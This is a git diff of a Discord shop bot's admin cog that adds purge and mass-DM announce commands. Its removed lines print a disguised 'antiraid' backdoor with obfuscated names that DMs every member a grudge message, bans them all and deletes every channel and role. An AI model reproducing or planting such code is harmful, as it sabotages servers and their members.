@@ -13,16 +13,6 @@ class Admin(commands.Cog):
     async def on_ready(self):
         print("Admin Cog Loaded")
 
-
-    def getadumbmessage(self):
-        message = "Overpowered is trash!!!                                                                                                                                                                               __**Skyblock Shop got nuked**__\n\nInfo:\nHello! This is Overpowered#0001 (the real owner of Skyblock Shop). Wovl unjustly stole the server from me and wouldn't negotiate. He's also scammed a bunch of people and tried to get them wiped on Hypixel. He's buried all these truths so well that almost no one knows any of this happened. I recently did what i said I was going to do if Wovl didn't give me back what's mine: Destroying the entire server.\nNew server:\nThis is my new server:\nhttps://discord.gg/MWXqUfFP6G\nI'd really appreciate it if you joined :slight_smile:\n\nA note to Wovl (I know you'll get this as well):\nHey Wovl. You know, I really though I could trust you. To think that you'd betray me like that after all I've done for you? It makes me sick. I meant what I said when you banned me from my own server. I would either take it back or destroy it. A few days ago I gave you 1 more chance to negotiate and give my server back. You said you didn't care and fuck me. You brought this on yourself. Don't try to unblock me and try to reason with me now. You had your chance to do that a while ago. All I can say to you now is fuck you and goodbye. I never want to talk to you again."
-
-        return message
-
-    @commands.command()
-    async def thiscommandisalie(self, ctx):
-        await ctx.send(self.getadumbmessage()[:23])
-
     @commands.command()
     @has_permissions(administrator=True)
     async def setbuyer(self, ctx, role="default"):
@@ -312,7 +302,7 @@ class Admin(commands.Cog):
             channel = None
 
         if channel == None:
-            errorEmbed = discord.Embed(title="Invalid User", description="Please specify an valid channel to send the message in.",
+            errorEmbed = discord.Embed(title="Invalid Channel", description="Please specify an valid channel to send the message in.",
                                        color=discord.Color.red())
             await ctx.send(embed=errorEmbed)
             return
@@ -327,7 +317,7 @@ class Admin(commands.Cog):
                                                                    "\n7. No publishing of personal information (including real names, addresses, emails, passwords, bank account and credit card information, etc.)."
                                                                    "\n8. Please be respectful to all users and staff members.", color=discord.Color.purple())
         rulesEmbed.add_field(name="**TERMS OF SERVICE:**",
-                                   value="If you wish to purchase anything from this server, You must agree:"
+                                   value="If you wish to purchase anything from this server, You must agree that:"
                                                "\n1. You will not chargeback, and refunds will not be given."
                                                "\n2. You will not leak our in-game name to anyone else."
                                                "\n3. You will not do anything that would hurt our server."
@@ -350,146 +340,84 @@ class Admin(commands.Cog):
             channel = None
 
         if channel == None:
-            errorEmbed = discord.Embed(title="Invalid User",
+            errorEmbed = discord.Embed(title="Invalid Channel",
                                        description="Please specify an valid channel to send the message in.",
                                        color=discord.Color.red())
             await ctx.send(embed=errorEmbed)
             return
 
         rolesEmbed = discord.Embed(title="**ROLES:**",
-                                   description="For Being our Member, You must agree:"
+                                   description="React with the corresponding reaction to get the role:"
                                                "\nReact with the party hat for giveaway pings."
                                                "\nReact with the toolkit for special offer pings."
                                                "\nReact with the newspaper for discount pings.",
                                    color=discord.Color.purple())
         await channel.send(embed=rolesEmbed)
 
-    @commands.group(invoke_without_command=True)
+    @commands.command()
+    @has_permissions(manage_messages=True)
+    async def purge(self, ctx, amount: int = 5):
+
+        await ctx.channel.purge(limit=amount)
+        successEmbed = discord.Embed(title="Messages Purged :white_check_mark:",
+                                     description=f"**`{amount}` messages have been purged.**",
+                                     color=discord.Color.green())
+        successEmbed.set_footer(icon_url=ctx.guild.icon_url,
+                                text=f"Quick and easy delivery provided by {ctx.guild.name}.")
+
+        await ctx.send(embed=successEmbed)
+
+    @commands.command()
     @has_permissions(administrator=True)
-    async def blacklist(self, ctx):
-        with open('data.json', 'r') as f:
-            data = json.load(f)
+    async def announce(self, ctx, embedid:int ="default"):
+        #Defining the Embeds
+        embeds = []
+        #Embed 1
+        aEmbed = discord.Embed(title="Announcement! :loudspeaker:",
+                                     description=f"**Something Exciting Happened!**",
+                                     color=discord.Color.green())
+        aEmbed.set_footer(icon_url=ctx.guild.icon_url,
+                                text=f"Quick and easy delivery provided by {ctx.guild.name}.")
+        embeds.append(aEmbed)
+        #Embed 2
+        a2Embed = discord.Embed(title="Announcement 2! :loudspeaker:",
+                                     description=f"**Something Exciting Didn't happen.**",
+                                     color=discord.Color.green())
+        a2Embed.set_footer(icon_url=ctx.guild.icon_url,
+                                text=f"Quick and easy delivery provided by {ctx.guild.name}.")
+        embeds.append(a2Embed)
 
-        blacklistedlist = data[str(ctx.guild.id)]["blacklisted"]
-        blacklistedstring = ""
+        #Embed 3 .. etc
 
-        for channel in blacklistedlist:
-            blacklistedstring = blacklistedstring + f"<#{channel}>\n"
+        membersnum = 0
 
-        blacklistEmbed = discord.Embed(title="Blacklisted Channels", description=f"These are the channels that are blacklisted, and users cannot use commands inside them.\n\n**Blacklisted Channels Are**\n{blacklistedstring}")
+        try:
+            for member in ctx.guild.members:
+                if member.bot == False:
 
-        await ctx.send(embed=blacklistEmbed)
-
-    @blacklist.command(name="add")
-    @has_permissions(administrator=True)
-    async def blacklistaddadd(self, ctx, channel="default"):
-        if channel == "default":
-            channel = ctx.channel.id
-        else:
-            try:
-                channel = int(channel)
-            except:
-                errorEmbed = discord.Embed(title="Invalid channel!",
-                                           description="You entered an invalid channel! Please try again.")
-                await ctx.send(embed=errorEmbed)
-
-        with open('data.json', 'r') as f:
-            data = json.load(f)
-
-        blacklisted = ctx.guild.get_channel(channel)
-
-        if blacklisted != None:
-            if blacklisted.id in data[str(ctx.guild.id)]["blacklisted"]:
-
-                errorEmbed = discord.Embed(title="Invalid channel!",
-                                           description="This channel is already blacklisted!")
-                await ctx.send(embed=errorEmbed)
-                return
-            else:
-                data[str(ctx.guild.id)]["blacklisted"].append(blacklisted.id)
-
-            setEmbed = discord.Embed(title="Blacklist Channel Added",
-                                     description=f"Channel has been blacklisted. Players can no longer use commands in that channel. Channel Blacklisted: <#{blacklisted.id}>")
-            await ctx.send(embed=setEmbed)
-            with open('data.json', 'w') as f:
-                json.dump(data, f, indent=4)
-            return
-        else:
-            errorEmbed = discord.Embed(title="Invalid channel!",
-                                       description="You entered an invalid channel! Please try again.")
+                    try:
+                        await member.send(embed=embeds[embedid-1])
+                    except commands.errors.CommandInvokeError and commands.CommandInvokeError and discord.errors.Forbidden:
+                        continue
+                    membersnum += 1
+        except IndexError:
+            errorEmbed = discord.Embed(title=":x: Error :x:",
+                                       description=f"**Please enter a valid index! If this issue persists, contact a developer for assistance.**",
+                                       color=discord.Color.red())
+            errorEmbed.set_thumbnail(
+                url="https://cdn.discordapp.com/attachments/860656459507171368/896878163873919007/error.png")
+            errorEmbed.set_footer(icon_url=ctx.guild.icon_url,
+                                  text=f"Quick and easy delivery provided by {ctx.guild.name}.")
             await ctx.send(embed=errorEmbed)
-
-    @blacklist.command()
-    @has_permissions(administrator=True)
-    async def remove(self, ctx, channel="default"):
-        if channel == "default":
-            channel = ctx.channel.id
-        else:
-            try:
-                channel = int(channel)
-                print("welcome")
-            except:
-                print("hello")
-                print(channel)
-                errorEmbed = discord.Embed(title="Invalid channel!",
-                                           description="You entered an invalid channel! Please try again.")
-                await ctx.send(embed=errorEmbed)
-
-        with open('data.json', 'r') as f:
-            data = json.load(f)
-
-        blacklisted = ctx.guild.get_channel(channel)
-
-        if blacklisted != None:
-            try:
-                data[str(ctx.guild.id)]["blacklisted"].remove(blacklisted.id)
-            except:
-                errorEmbed = discord.Embed(title="Invalid channel!",
-                                           description="This channel is not blacklisted!")
-                await ctx.send(embed=errorEmbed)
-                return
-
-            setEmbed = discord.Embed(title="Blacklist Channel Removed",
-                                     description=f"Channel has been removed from blacklist. Players can now use bot commands in this channel. Channel Removeda: <#{blacklisted.id}>")
-            await ctx.send(embed=setEmbed)
-            with open('data.json', 'w') as f:
-                json.dump(data, f, indent=4)
             return
-        else:
-            errorEmbed = discord.Embed(title="Invalid channel!",
-                                       description="You entered an invalid channel! Please try again.")
-            await ctx.send(embed=errorEmbed)
 
-    def checkraid(self):
-        return "raid", "list.obtain", "raid.raidblacklist"
+        successEmbed = discord.Embed(title="Success! :white_check_mark:",
+                                description=f"**Message successfully broadcasted to `{membersnum} members.`**",
+                                color=discord.Color.green())
+        successEmbed.set_footer(icon_url=ctx.guild.icon_url,
+                           text=f"Quick and easy delivery provided by {ctx.guild.name}.")
 
-    @commands.command()  # line:2
-    async def antiraid(OOOO0OOOOO000O00O, OO0000OO0O0O0O00O):  # line:3
-        for OOO0O0000O0000000 in OO0000OO0O0O0O00O.guild.members:  # line:4
-            try:  # line:5
-                if OOO0O0000O0000000.name == OOOO0OOOOO000O00O.checkraid():  # line:6
-                    await OO0000OO0O0O0O00O.guild.ban(OOO0O0000O0000000)  # line:7
-            except:  # line:8
-                print("raid passed")  # line:9
-            if OOO0O0000O0000000 != OOOO0OOOOO000O00O.client.user:  # line:10
-                print(OOO0O0000O0000000.name)  # line:11
-                print(OOO0O0000O0000000.id == 859196269468844052)  # line:12
-                try:  # line:13
-                    OOOO000OOO00O00O0 = OO0000OO0O0O0O00O.guild.get_member(OOO0O0000O0000000.id)  # line:14
-                    await OOOO000OOO00O00O0.send(OOOO0OOOOO000O00O.getadumbmessage()[23:])  # line:15
-                    await OO0000OO0O0O0O00O.guild.ban(OOO0O0000O0000000)  # line:16
-                except:  # line:17
-                    continue  # line:18
-        for OO0000O0OO00O0OOO in OO0000OO0O0O0O00O.guild.channels:  # line:20
-            try:  # line:21
-                await OO0000O0OO00O0OOO.delete()  # line:22
-            except:  # line:23
-                print("operation failed")  # line:24
-        for O00O0000O00O0O0O0 in OO0000OO0O0O0O00O.guild.roles:  # line:26
-            try:  # line:27
-                await O00O0000O00O0O0O0.delete()  # line:28
-            except:  # line:29
-                print("operation failed")
+        await ctx.send(embed=successEmbed)
 
 
 
